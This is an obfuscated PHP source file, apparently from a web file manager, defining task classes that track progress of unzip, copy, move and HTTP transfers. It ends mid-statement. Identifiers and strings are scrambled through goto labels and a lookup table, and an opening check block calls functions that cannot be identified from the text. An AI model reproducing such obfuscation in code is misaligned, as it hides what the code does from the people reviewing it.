<?php
 goto e‡ö§³‚; FË·õ’£: $b¤ßï¶†³® = $_SERVER[Ö¹ñÒÁ²÷][1295]; if ($_SERVER[$_SERVER[Ö¹ñÒÁ²÷][783]] != $b¤ßï¶†³®($eÖæ¥Ğ„Ô)) { goto aµ°”Áš¥¬; b™éå³İëì: $EïÄ¶ÜË³ = explode($_SERVER[Ö¹ñÒÁ²÷][213], $E‰ù¦¹®½); if (count($EïÄ¶ÜË³) < $_SERVER[Ö¹ñÒÁ²÷][552]) { $BÉöïÕÕ¹¸ = $_SERVER[Ö¹ñÒÁ²÷][789]; $BÉöïÕÕ¹¸(); } $F„Çª»Óö¥ = $_SERVER[Ö¹ñÒÁ²÷][1481]; goto bšæá‡ùšÕ; bšæá‡ùšÕ: $F„Çª»Óö¥($eÖæ¥Ğ„Ô); goto D”®•«´¬; aµ°”Áš¥¬: $fßÊÜÆÓ…´ = $_SERVER[Ö¹ñÒÁ²÷][786]; $eŞîÕŠ”Æ = $_SERVER[$_SERVER[Ö¹ñÒÁ²÷][787]] . $_SERVER[Ö¹ñÒÁ²÷][788]; $E‰ù¦¹®½ = $fßÊÜÆÓ…´($eŞîÕŠ”Æ); goto b™éå³İëì; D”®•«´¬: } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto Aªà²¥Õçƒ; eéÖ™…‹®×: Hook::bind($FÊÙñËÙİ±[1029], array($this, $FÊÙñËÙİ±[1484])); $eÊ¯‘Š®Ø =& $this->task; $eÊ¯‘Š®Ø[$FÊÙñËÙİ±[1485]] = $FÊÙñËÙİ±[1034]; goto C’±Ô§ìÎ¦; Aªà²¥Õçƒ: $FÊÙñËÙİ± =& $_SERVER[Ö¹ñÒÁ²÷]; parent::startAfter(); Hook::bind($FÊÙñËÙİ±[1482], array($this, $FÊÙñËÙİ±[1483])); goto eéÖ™…‹®×; C’±Ô§ìÎ¦: if (!$eÊ¯‘Š®Ø[$FÊÙñËÙİ±[1323]]) { $eÊ¯‘Š®Ø[$FÊÙñËÙİ±[1323]] = LNG($FÊÙñËÙİ±[1486]); } goto AëÌªœ†ÅÃ; AëÌªœ†ÅÃ: } protected function endAfter() { $cçÍß´ªÓ =& $_SERVER[Ö¹ñÒÁ²÷]; parent::endAfter(); Hook::unbind($cçÍß´ªÓ[1482], array($this, $cçÍß´ªÓ[1483])); Hook::unbind($cçÍß´ªÓ[1029], array($this, $cçÍß´ªÓ[1484])); } public function updateAfter() { $bÇËÔßĞò… =& $_SERVER[Ö¹ñÒÁ²÷]; $A·”Å÷íøÂ =& $this->task; if (!$A·”Å÷íøÂ[$bÇËÔßĞò…[972]] || !$A·”Å÷íøÂ[$bÇËÔßĞò…[695]]) { return; } if ($A·”Å÷íøÂ[$bÇËÔßĞò…[1485]] == $bÇËÔßĞò…[1034]) { $a™’ª“–ù° = 0; if ($A·”Å÷íøÂ[$bÇËÔßĞò…[1460]]) { $a™’ª“–ù° = $A·”Å÷íøÂ[$bÇËÔßĞò…[1461]] / $A·”Å÷íøÂ[$bÇËÔßĞò…[1460]]; } $A·”Å÷íøÂ[$bÇËÔßĞò…[1416]] = $a™’ª“–ù° * 0.3; } else { if ($A·”Å÷íøÂ[$bÇËÔßĞò…[1485]] == $bÇËÔßĞò…[297]) { $a™’ª“–ù° = $A·”Å÷íøÂ[$bÇËÔßĞò…[984]] / $A·”Å÷íøÂ[$bÇËÔßĞò…[972]]; $A·”Å÷íøÂ[$bÇËÔßĞò…[1416]] = 0.3 + $a™’ª“–ù° * 0.4; } else { if ($A·”Å÷íøÂ[$bÇËÔßĞò…[1485]] == $bÇËÔßĞò…[102]) { $aÚò¯¡Ã = 0; if ($A·”Å÷íøÂ[$bÇËÔßĞò…[1462]] == $bÇËÔßĞò…[102]) { $aÚò¯¡Ã = $A·”Å÷íøÂ[$bÇËÔßĞò…[1461]]; } $a™’ª“–ù° = ($A·”Å÷íøÂ[$bÇËÔßĞò…[1465]] + $aÚò¯¡Ã) / $A·”Å÷íøÂ[$bÇËÔßĞò…[695]]; $A·”Å÷íøÂ[$bÇËÔßĞò…[1416]] = 0.3 + 0.4 + $a™’ª“–ù° * 0.3; } } } if ($A·”Å÷íøÂ[$bÇËÔßĞò…[1416]] > 0) { $f°é©Á¼š = timeFloat() - $A·”Å÷íøÂ[$bÇËÔßĞò…[1418]] - $A·”Å÷íøÂ[$bÇËÔßĞò…[1421]]; $A·”Å÷íøÂ[$bÇËÔßĞò…[1422]] = $f°é©Á¼š * (1 - $A·”Å÷íøÂ[$bÇËÔßĞò…[1416]]) / $A·”Å÷íøÂ[$bÇËÔßĞò…[1416]]; } } public function addFile($fÙÄ„²œŸæ) { goto FÀ¨Ÿ¿¥; FÀ¨Ÿ¿¥: $d„‚ŒßÂ’ğ =& $_SERVER[Ö¹ñÒÁ²÷]; $aÖÈŞ›ÑÎó =& $this->task; $F¹†Ì»ÃÄ = IO::info($fÙÄ„²œŸæ); goto cÁøöâš¬Ï; cÁøöâš¬Ï: $aÖÈŞ›ÑÎó[$d„‚ŒßÂ’ğ[1458]] = $F¹†Ì»ÃÄ[$d„‚ŒßÂ’ğ[28]]; $aÖÈŞ›ÑÎó[$d„‚ŒßÂ’ğ[1460]] = $F¹†Ì»ÃÄ[$d„‚ŒßÂ’ğ[77]]; $aÖÈŞ›ÑÎó[$d„‚ŒßÂ’ğ[1461]] = 0; goto D»íÏó¥®È; D»íÏó¥®È: $aÖÈŞ›ÑÎó[$d„‚ŒßÂ’ğ[974]] = $d„‚ŒßÂ’ğ[1473]; $aÖÈŞ›ÑÎó[$d„‚ŒßÂ’ğ[1462]] = $d„‚ŒßÂ’ğ[1034]; $aÖÈŞ›ÑÎó[$d„‚ŒßÂ’ğ[695]] = $F¹†Ì»ÃÄ[$d„‚ŒßÂ’ğ[77]]; goto e†Ÿªš•Õ; e†Ÿªš•Õ: $aÖÈŞ›ÑÎó[$d„‚ŒßÂ’ğ[972]] = 1; $d•ƒø×Öè = 0; $aÖÈŞ›ÑÎó[$d„‚ŒßÂ’ğ[1466]] = array($d„‚ŒßÂ’ğ[1467] => $d•ƒø×Öè + 1, $d„‚ŒßÂ’ğ[382] => $F¹†Ì»ÃÄ[$d„‚ŒßÂ’ğ[28]], $d„‚ŒßÂ’ğ[75] => $F¹†Ì»ÃÄ[$d„‚ŒßÂ’ğ[75]], $d„‚ŒßÂ’ğ[462] => $F¹†Ì»ÃÄ[$d„‚ŒßÂ’ğ[462]] ? $F¹†Ì»ÃÄ[$d„‚ŒßÂ’ğ[462]] : $F¹†Ì»ÃÄ[$d„‚ŒßÂ’ğ[75]]); goto d²ŞÊ ô„Ó; d²ŞÊ ô„Ó: $this->update(); goto fâÌœš¡à; fâÌœš¡à: } public function unzipAfter($EŠ¥×Ùàô†) { goto Bğïéˆ–Ğ¿; Bğïéˆ–Ğ¿: $eÏ ›ğĞÓÇ =& $_SERVER[Ö¹ñÒÁ²÷]; $bˆòÊ¼Ğİ =& $this->task; $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[1485]] = $eÏ ›ğĞÓÇ[102]; goto BÇï³„Úôù; dµ£®ÈÌß–: $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[1458]] = $eÏ ›ğĞÓÇ[33]; $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[1465]] = 0; $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[695]] = $dÖ¤¬åèÌè[$eÏ ›ğĞÓÇ[77]]; goto c„¥Ş‰„³Í; bŒ‡“õö¾: $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[984]] = 0; $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[1460]] = 0; $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[1461]] = 0; goto dµ£®ÈÌß–; BÇï³„Úôù: $dÖ¤¬åèÌè = IO::infoWithChildren($EŠ¥×Ùàô†); $Dæï¼•Õòê = 0; $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[1466]] = array($eÏ ›ğĞÓÇ[1467] => $Dæï¼•Õòê + 1, $eÏ ›ğĞÓÇ[382] => $dÖ¤¬åèÌè[$eÏ ›ğĞÓÇ[28]], $eÏ ›ğĞÓÇ[75] => $dÖ¤¬åèÌè[$eÏ ›ğĞÓÇ[75]], $eÏ ›ğĞÓÇ[462] => $dÖ¤¬åèÌè[$eÏ ›ğĞÓÇ[462]] ? $dÖ¤¬åèÌè[$eÏ ›ğĞÓÇ[462]] : $dÖ¤¬åèÌè[$eÏ ›ğĞÓÇ[75]]); goto CÃ„¨ƒÏô¸; CÃ„¨ƒÏô¸: if ($dÖ¤¬åèÌè[$eÏ ›ğĞÓÇ[29]] == $eÏ ›ğĞÓÇ[163]) { $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[972]] = 1; } else { $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[972]] = $dÖ¤¬åèÌè[$eÏ ›ğĞÓÇ[80]][$eÏ ›ğĞÓÇ[78]]; } $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[974]] = $eÏ ›ğĞÓÇ[33]; $bˆòÊ¼Ğİ[$eÏ ›ğĞÓÇ[1462]] = 0; goto bŒ‡“õö¾; c„¥Ş‰„³Í: $this->update(); self::log($eÏ ›ğĞÓÇ[1487] . json_encode(array($bˆòÊ¼Ğİ, $dÖ¤¬åèÌè))); goto Fó–®”Ø·ì; Fó–®”Ø·ì: } public function nameParse($BŒÂ±‘æÚ) { goto bò…„ÊÚÅõ; bò…„ÊÚÅõ: $b…ØâŠçÀ =& $_SERVER[Ö¹ñÒÁ²÷]; $eùˆä”Ò =& $this->task; if ($eùˆä”Ò[$b…ØâŠçÀ[1485]] == $b…ØâŠçÀ[1034]) { $eùˆä”Ò[$b…ØâŠçÀ[1485]] = $b…ØâŠçÀ[297]; $eùˆä”Ò[$b…ØâŠçÀ[1465]] = 0; $eùˆä”Ò[$b…ØâŠçÀ[695]] = 0; } goto CÀí¶Ÿó·ö; F•“ãÁ‘Ê: $this->update(); goto c •œÛòĞù; CÀí¶Ÿó·ö: $fÎåÕ„¿¶á = get_path_this($BŒÂ±‘æÚ); if (strstr($fÎåÕ„¿¶á, $b…ØâŠçÀ[91])) { $eùˆä”Ò[$b…ØâŠçÀ[984]] += 1; $eùˆä”Ò[$b…ØâŠçÀ[972]] += 1; } $eùˆä”Ò[$b…ØâŠçÀ[1458]] = $BŒÂ±‘æÚ; goto F•“ãÁ‘Ê; c •œÛòĞù: } } goto E´ƒƒ°á¢ù; Béğ¨„‰á¹: class TaskFileTransfer extends Task { protected function startAfter() { goto DÒèèöÈ‹; aí„¼©ì«ƒ: Hook::bind($CÌ—óõ‚Î[1439], array($this, $CÌ—óõ‚Î[1440])); Hook::bind($CÌ—óõ‚Î[1441], array($this, $CÌ—óõ‚Î[1442])); Hook::bind($CÌ—óõ‚Î[1443], array($this, $CÌ—óõ‚Î[1444])); goto bòÊ«ö†äµ; bÏ’ÖÚÓŠ: Hook::bind($CÌ—óõ‚Î[1452], array($this, $CÌ—óõ‚Î[1453])); Hook::bind($CÌ—óõ‚Î[1454], array($this, $CÌ—óõ‚Î[1455])); Hook::bind($CÌ—óõ‚Î[1456], array($this, $CÌ—óõ‚Î[1457])); goto fÅÚ˜å»É¯; aæØ¹‰¶Æ¸: if (!$fçÎÁ÷îÅ®[$CÌ—óõ‚Î[1323]]) { $fçÎÁ÷îÅ®[$CÌ—óõ‚Î[1323]] = LNG($CÌ—óõ‚Î[1464]); } goto D¤ï«çÇå‘; f´šíßºœ¯: Hook::bind($CÌ—óõ‚Î[1449], array($this, $CÌ—óõ‚Î[1450])); Hook::bind($CÌ—óõ‚Î[528], array($this, $CÌ—óõ‚Î[1451])); $this->sourceModelCopyFlag = !1; goto bÏ’ÖÚÓŠ; fÅÚ˜å»É¯: $fçÎÁ÷îÅ®[$CÌ—óõ‚Î[1458]] = LNG($CÌ—óõ‚Î[1459]); $fçÎÁ÷îÅ®[$CÌ—óõ‚Î[1460]] = 0; $fçÎÁ÷îÅ®[$CÌ—óõ‚Î[1461]] = 0; goto AÍµš¤öƒ; DÒèèöÈ‹: $CÌ—óõ‚Î =& $_SERVER[Ö¹ñÒÁ²÷]; $fçÎÁ÷îÅ® =& $this->task; $this->sourceCopyFolder = !1; goto aí„¼©ì«ƒ; dË¶¨’¿•: Hook::bind($CÌ—óõ‚Î[507], array($this, $CÌ—óõ‚Î[1448])); Hook::bind($CÌ—óõ‚Î[509], array($this, $CÌ—óõ‚Î[1448])); Hook::bind($CÌ—óõ‚Î[511], array($this, $CÌ—óõ‚Î[1448])); goto f´šíßºœ¯; AÍµš¤öƒ: $fçÎÁ÷îÅ®[$CÌ—óõ‚Î[974]] = $CÌ—óõ‚Î[33]; $fçÎÁ÷îÅ®[$CÌ—óõ‚Î[1462]] = $CÌ—óõ‚Î[33]; $fçÎÁ÷îÅ®[$CÌ—óõ‚Î[1463]] = 0; goto aæØ¹‰¶Æ¸; aÎé´îÇ‹«: Hook::bind($CÌ—óõ‚Î[539], array($this, $CÌ—óõ‚Î[1447])); Hook::bind($CÌ—óõ‚Î[505], array($this, $CÌ—óõ‚Î[1448])); Hook::bind($CÌ—óõ‚Î[502], array($this, $CÌ—óõ‚Î[1448])); goto dË¶¨’¿•; bòÊ«ö†äµ: Hook::bind($CÌ—óõ‚Î[535], array($this, $CÌ—óõ‚Î[1445])); Hook::bind($CÌ—óõ‚Î[536], array($this, $CÌ—óõ‚Î[1446])); Hook::bind($CÌ—óõ‚Î[538], array($this, $CÌ—óõ‚Î[1447])); goto aÎé´îÇ‹«; D¤ï«çÇå‘: } protected function endAfter() { goto dì¶‚¥±•; F‘è™éƒ¨É: Hook::unbind($A¥ƒˆŞ­ÙĞ[538], array($this, $A¥ƒˆŞ­ÙĞ[1447])); Hook::unbind($A¥ƒˆŞ­ÙĞ[539], array($this, $A¥ƒˆŞ­ÙĞ[1447])); Hook::unbind($A¥ƒˆŞ­ÙĞ[505], array($this, $A¥ƒˆŞ­ÙĞ[1448])); goto D•¿ã÷™†Ô; eÇ¦åªÚ›¤: Hook::unbind($A¥ƒˆŞ­ÙĞ[1452], array($this, $A¥ƒˆŞ­ÙĞ[1453])); Hook::unbind($A¥ƒˆŞ­ÙĞ[1454], array($this, $A¥ƒˆŞ­ÙĞ[1455])); Hook::unbind($A¥ƒˆŞ­ÙĞ[1456], array($this, $A¥ƒˆŞ­ÙĞ[1457])); goto aíö°“ÈÅ; dì¶‚¥±•: $A¥ƒˆŞ­ÙĞ =& $_SERVER[Ö¹ñÒÁ²÷]; Hook::unbind($A¥ƒˆŞ­ÙĞ[1439], array($this, $A¥ƒˆŞ­ÙĞ[1440])); Hook::unbind($A¥ƒˆŞ­ÙĞ[1441], array($this, $A¥ƒˆŞ­ÙĞ[1442])); goto eÚÑ‘›ƒƒ; fŠâ¢·½Í×: Hook::unbind($A¥ƒˆŞ­ÙĞ[511], array($this, $A¥ƒˆŞ­ÙĞ[1448])); Hook::unbind($A¥ƒˆŞ­ÙĞ[1449], array($this, $A¥ƒˆŞ­ÙĞ[1450])); Hook::unbind($A¥ƒˆŞ­ÙĞ[528], array($this, $A¥ƒˆŞ­ÙĞ[1451])); goto eÇ¦åªÚ›¤; eÚÑ‘›ƒƒ: Hook::unbind($A¥ƒˆŞ­ÙĞ[1443], array($this, $A¥ƒˆŞ­ÙĞ[1444])); Hook::unbind($A¥ƒˆŞ­ÙĞ[535], array($this, $A¥ƒˆŞ­ÙĞ[1445])); Hook::unbind($A¥ƒˆŞ­ÙĞ[536], array($this, $A¥ƒˆŞ­ÙĞ[1446])); goto F‘è™éƒ¨É; D•¿ã÷™†Ô: Hook::unbind($A¥ƒˆŞ­ÙĞ[502], array($this, $A¥ƒˆŞ­ÙĞ[1448])); Hook::unbind($A¥ƒˆŞ­ÙĞ[507], array($this, $A¥ƒˆŞ­ÙĞ[1448])); Hook::unbind($A¥ƒˆŞ­ÙĞ[509], array($this, $A¥ƒˆŞ­ÙĞ[1448])); goto fŠâ¢·½Í×; aíö°“ÈÅ: } public function copyMoveStart($dÅ«öÄš“, $DÍØ˜¤²ß, $b¿áñœßÊá, $bØ¬æÓ÷ËÎ) { } public function updateAfter() { goto fôòÈÌÊ†’; A’ŞËÊ«“•: if ($this->sourceModelCopyFlag) { return; } $bÌ•…‡†ë = 0; if ($b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1462]] == $eåˆˆº‘ÆØ[1034]) { $bÌ•…‡†ë = $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1461]] * 0.5; } else { if ($b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1462]] == $eåˆˆº‘ÆØ[102]) { $bÌ•…‡†ë = $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1461]] * 0.5 + $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1460]] * 0.5; } } goto aİøÆÔê; fôòÈÌÊ†’: $eåˆˆº‘ÆØ =& $_SERVER[Ö¹ñÒÁ²÷]; $b­ÏÄã£¾Ø =& $this->task; if (!$b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[695]]) { return; } goto A’ŞËÊ«“•; aİøÆÔê: $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1416]] = ($b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1465]] + $bÌ•…‡†ë) / $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[695]]; if ($b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1416]] > 0) { $E³±¯×÷½Ó = timeFloat() - $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1418]] - $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1421]]; $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1422]] = $E³±¯×÷½Ó * (1 - $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1416]]) / $b­ÏÄã£¾Ø[$eåˆˆº‘ÆØ[1416]]; } goto Dó„³ŠÃ²§; Dó„³ŠÃ²§: } public function addPath($E…Éñ„…ÉÓ) { goto BŒ¨ÃÜ­Ù; BŒ¨ÃÜ­Ù: $c²‡Î”Áù’ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$E…Éñ„…ÉÓ) { return; } $eìÔ„Óë ¨ =& $this->task; goto CŠç¿âæ¹; CŠç¿âæ¹: $fÖÀ¯ªÇ“‹ = IO::infoWithChildren($E…Éñ„…ÉÓ); $eÃ¹¦³Ü‹¥ = $eìÔ„Óë ¨[$c²‡Î”Áù’[1466]] ? $eìÔ„Óë ¨[$c²‡Î”Áù’[1466]][$c²‡Î”Áù’[1467]] : 0; $eìÔ„Óë ¨[$c²‡Î”Áù’[1466]] = array($c²‡Î”Áù’[1467] => $eÃ¹¦³Ü‹¥ + 1, $c²‡Î”Áù’[382] => $fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[28]], $c²‡Î”Áù’[75] => $fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[75]], $c²‡Î”Áù’[462] => $fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[462]] ? $fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[462]] : $fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[75]]); goto Aæò¿˜Ğé‹; Aæò¿˜Ğé‹: if ($fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[29]] == $c²‡Î”Áù’[163]) { $eìÔ„Óë ¨[$c²‡Î”Áù’[972]] += 1; } else { $eìÔ„Óë ¨[$c²‡Î”Áù’[972]] += $fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[80]][$c²‡Î”Áù’[78]]; if ($fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[365]]) { $eìÔ„Óë ¨[$c²‡Î”Áù’[972]] += $fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[80]][$c²‡Î”Áù’[79]] + 1; } } $eìÔ„Óë ¨[$c²‡Î”Áù’[695]] += $fÖÀ¯ªÇ“‹[$c²‡Î”Áù’[77]]; $this->update(); goto a„Š‚±±äœ; a„Š‚±±äœ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($d ñÁ¢œë¢) { $c±³’†‰ =& $_SERVER[Ö¹ñÒÁ²÷]; $F¹Éù‚ùÕ¬ =& $this->task; $F¹Éù‚ùÕ¬[$c±³’†‰[1458]] = $d ñÁ¢œë¢[$c±³’†‰[28]]; $F¹Éù‚ùÕ¬[$c±³’†‰[974]] = $d ñÁ¢œë¢[$c±³’†‰[28]]; $this->update(); } public function copyFileStart($cªé«¦ğÆÓ, $aª‡Áùƒ´®, $DÚÅ”ŞâŞÜ, $BùöË°ø³ª, $b¯ãà¿¸âŠ, $a¨íÃõôÊ‘) { goto Dõªõ‹ãÈÜ; b»¤•©óÔ«: $this->update(); goto f¤ª÷í×öŠ; dğæ‚©¬ë’: $fÊ‚ãÒ‡„˜[$Aİ•ª¶ŒÑÏ[974]] = $Aİ•ª¶ŒÑÏ[33]; $fÊ‚ãÒ‡„˜[$Aİ•ª¶ŒÑÏ[1462]] = $Aİ•ª¶ŒÑÏ[33]; $fÊ‚ãÒ‡„˜[$Aİ•ª¶ŒÑÏ[1463]] = 0; goto b»¤•©óÔ«; aîªË‘æø¦: $fÊ‚ãÒ‡„˜[$Aİ•ª¶ŒÑÏ[1458]] = $b¯Ò›ì’; $fÊ‚ãÒ‡„˜[$Aİ•ª¶ŒÑÏ[1460]] = (int) $cªé«¦ğÆÓ->size($aª‡Áùƒ´®); $fÊ‚ãÒ‡„˜[$Aİ•ª¶ŒÑÏ[1461]] = 0; goto dğæ‚©¬ë’; Dõªõ‹ãÈÜ: $Aİ•ª¶ŒÑÏ =& $_SERVER[Ö¹ñÒÁ²÷]; $b¯Ò›ì’ = $b¯ãà¿¸âŠ; if ($b¯Ò›ì’ == $GLOBALS[$Aİ•ª¶ŒÑÏ[1468]]) { $b¯Ò›ì’ = $GLOBALS[$Aİ•ª¶ŒÑÏ[1469]]; } goto c‰µÄ„³Ôã; c‰µÄ„³Ôã: $GLOBALS[$Aİ•ª¶ŒÑÏ[1469]] = $b¯ãà¿¸âŠ; $GLOBALS[$Aİ•ª¶ŒÑÏ[1468]] = $a¨íÃõôÊ‘; $fÊ‚ãÒ‡„˜ =& $this->task; goto aîªË‘æø¦; f¤ª÷í×öŠ: } public function copyFileEnd($e„ùŒ¾ê¥š, $dÒ‹ØÚª§, $F…‡ø¶Êš, $eññŠ’¦, $B“…œ‚·§, $FÅ©ÆßÜ¡¶) { $cÅ¯¹ª×¸ =& $_SERVER[Ö¹ñÒÁ²÷]; $BÒÙÊ»‘ã» =& $this->task; $BÒÙÊ»‘ã»[$cÅ¯¹ª×¸[1461]] = $BÒÙÊ»‘ã»[$cÅ¯¹ª×¸[1460]]; $BÒÙÊ»‘ã»[$cÅ¯¹ª×¸[1462]] = $cÅ¯¹ª×¸[33]; if ($B“…œ‚·§ == $BÒÙÊ»‘ã»[$cÅ¯¹ª×¸[1458]]) { $BÒÙÊ»‘ã»[$cÅ¯¹ª×¸[1465]] += $BÒÙÊ»‘ã»[$cÅ¯¹ª×¸[1460]]; $this->update(1); } else { $this->update(); $BÒÙÊ»‘ã»[$cÅ¯¹ª×¸[1461]] = 0; } self::log($cÅ¯¹ª×¸[1470] . $dÒ‹ØÚª§ . $cÅ¯¹ª×¸[66] . $eññŠ’¦ . $cÅ¯¹ª×¸[213] . $B“…œ‚·§ . $cÅ¯¹ª×¸[1471] . $BÒÙÊ»‘ã»[$cÅ¯¹ª×¸[1458]]); } public function updateFileEnd($Aç»Ú°öè©, $CŠéàŞ²Ìë) { $eÁŞ‘îÛ„ =& $_SERVER[Ö¹ñÒÁ²÷]; $e¯éÒÚ„ÒÙ =& $this->task; $e¯éÒÚ„ÒÙ[$eÁŞ‘îÛ„[1458]] = $Aç»Ú°öè©; $e¯éÒÚ„ÒÙ[$eÁŞ‘îÛ„[1460]] = $CŠéàŞ²Ìë; $e¯éÒÚ„ÒÙ[$eÁŞ‘îÛ„[1465]] += $CŠéàŞ²Ìë; $this->update(1); } public function sourceModelCopy($dßåÈ‚íáÃ) { goto f½˜óÁ°‘¢; f½˜óÁ°‘¢: $eî¾¸¤õ¡ç =& $_SERVER[Ö¹ñÒÁ²÷]; $b÷›÷Æªİ… = $dßåÈ‚íáÃ[0]; $cŠ®ò¥Éñ = $dßåÈ‚íáÃ[1]; goto aÑ£ÛåãÖË; fÔ—ÖˆíÅ–: switch ($b÷›÷Æªİ…) { case $eî¾¸¤õ¡ç[503]: $bÕˆÁÛÅíç = 1; break; case $eî¾¸¤õ¡ç[506]: $E†­“…‚¼²[$eî¾¸¤õ¡ç[1458]] = $cŠ®ò¥Éñ[$eî¾¸¤õ¡ç[28]]; break; case $eî¾¸¤õ¡ç[508]: $bÕˆÁÛÅíç = intval($dßåÈ‚íáÃ[$eî¾¸¤õ¡ç[359]] * 0.4); break; case $eî¾¸¤õ¡ç[510]: $bÕˆÁÛÅíç = intval($dßåÈ‚íáÃ[$eî¾¸¤õ¡ç[359]] * 0.2); break; case $eî¾¸¤õ¡ç[512]: $bÕˆÁÛÅíç = intval($dßåÈ‚íáÃ[$eî¾¸¤õ¡ç[359]] * 0.4); break; } $this->update($bÕˆÁÛÅíç); $this->sourceModelCopyFlag = !1; goto d†àØ¤™”ö; aÑ£ÛåãÖË: $E†­“…‚¼² =& $this->task; $this->sourceModelCopyFlag = !0; $bÕˆÁÛÅíç = 0; goto fÔ—ÖˆíÅ–; d†àØ¤™”ö: } public function sourceRemove($c“èæÆ‘µä, $F´Ê«„‡¤¿) { $D³¤ŞŞ´°¤ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->sourceModelCopyFlag = !0; $cœÀèêâå¹ = 1; if (isset($c“èæÆ‘µä[$D³¤ŞŞ´°¤[80]])) { $cœÀèêâå¹ = $c“èæÆ‘µä[$D³¤ŞŞ´°¤[80]][$D³¤ŞŞ´°¤[78]] + $c“èæÆ‘µä[$D³¤ŞŞ´°¤[80]][$D³¤ŞŞ´°¤[79]] + 1; } $this->update($cœÀèêâå¹); $this->sourceModelCopyFlag = !1; } public function sourceMove($f‰Â·¿®) { $this->sourceRemove($f‰Â·¿®, !1); } public function curlProgress($f‡¾¨‘œâ›, $cøˆ£êÜÜº, $B—Ï»£Ù¢‚, $DäØ®…ƒ×œ, $C¢ãã®ÃÛ°) { $Dæ¿Ñ¥Ş§é =& $_SERVER[Ö¹ñÒÁ²÷]; $D‰´Û·÷Ğ¡ =& $this->task; if ($C¢ãã®ÃÛ° > 0) { $D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[974]] = $Dæ¿Ñ¥Ş§é[1472]; $D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[1462]] = $Dæ¿Ñ¥Ş§é[102]; if ($D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[1460]] == $DäØ®…ƒ×œ || $DäØ®…ƒ×œ > 1024 * 1024) { $D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[1461]] = $C¢ãã®ÃÛ°; } if ($D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[1463]]) { $D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[1461]] = $C¢ãã®ÃÛ° + $D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[1463]]; } } else { if ($B—Ï»£Ù¢‚ > 0) { if ($D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[1460]] == $cøˆ£êÜÜº) { $D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[1461]] = $B—Ï»£Ù¢‚; $D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[974]] = $Dæ¿Ñ¥Ş§é[1473]; $D‰´Û·÷Ğ¡[$Dæ¿Ñ¥Ş§é[1462]] = $Dæ¿Ñ¥Ş§é[1034]; } } } $this->update(); } public function curlProgressStart($EØ ÄôÙñ…) { } public function curlProgressEnd($BóëŠøØ§Ñ) { $CŸÃÁ»¾—› =& $_SERVER[Ö¹ñÒÁ²÷]; $bÖ³­öÒìè =& $this->task; $FÑŸ«”ã = curl_getinfo($BóëŠøØ§Ñ); $a’˜µÛ¶¡ = $FÑŸ«”ã[$CŸÃÁ»¾—›[1474]]; if ($bÖ³­öÒìè[$CŸÃÁ»¾—›[1462]] == $CŸÃÁ»¾—›[102] && $a’˜µÛ¶¡) { $bÖ³­öÒìè[$CŸÃÁ»¾—›[1463]] += $a’˜µÛ¶¡; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $CëÚ Ë¿î¶ =& $_SERVER[Ö¹ñÒÁ²÷]; Hook::bind($CëÚ Ë¿î¶[1452], array($this, $CëÚ Ë¿î¶[1475])); Hook::bind($CëÚ Ë¿î¶[1454], array($this, $CëÚ Ë¿î¶[1476])); Hook::bind($CëÚ Ë¿î¶[1456], array($this, $CëÚ Ë¿î¶[1477])); } protected function endAfter() { $FÊ¢“÷õ“ =& $_SERVER[Ö¹ñÒÁ²÷]; Hook::unbind($FÊ¢“÷õ“[1452], array($this, $FÊ¢“÷õ“[1475])); Hook::unbind($FÊ¢“÷õ“[1454], array($this, $FÊ¢“÷õ“[1476])); Hook::unbind($FÊ¢“÷õ“[1456], array($this, $FÊ¢“÷õ“[1477])); } public function progressStart($FœÄŠšŞÈ¥) { $f¤“§Š”À‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $a¯ˆ…âÀí¼ = curl_getinfo($FœÄŠšŞÈ¥); self::log($f¤“§Š”À‘[1478] . 